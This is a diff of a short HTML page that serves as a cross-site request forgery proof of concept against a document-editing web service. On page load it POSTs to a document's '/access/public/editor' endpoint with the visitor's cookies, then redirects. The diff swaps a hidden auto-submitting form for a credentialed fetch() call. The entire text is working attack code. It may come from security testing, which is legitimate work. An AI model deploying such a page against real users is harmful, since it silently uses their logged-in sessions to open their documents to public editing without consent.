@@ -1,14 +1,18 @@
 <!DOCTYPE html>
-<body onload="document.forms[0].submit()">
-<form method="POST" action="https://textjam.com/api/doc/H16U9PH6/access/public/editor" target="hiddenFrame">
-</form>
-
-<iframe name="hiddenFrame" style="display: none;"></iframe>
-
 <script>
-// Redirect after form submits
+// Auto-execute on page load
+fetch('https://staging.textjam.com/doc/H16U9PH6/access/public/editor', {
+    method: 'POST',
+    credentials: 'include',
+    mode: 'no-cors',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({})
+});
+
+// Redirect to the document API endpoint
 setTimeout(() => {
-    window.location.href = 'https://textjam.com/doc/H16U9PH6';
+    window.location.href = 'https://staging.textjam.com/doc/H16U9PH6';
 }, 500);
 </script>
-</body>
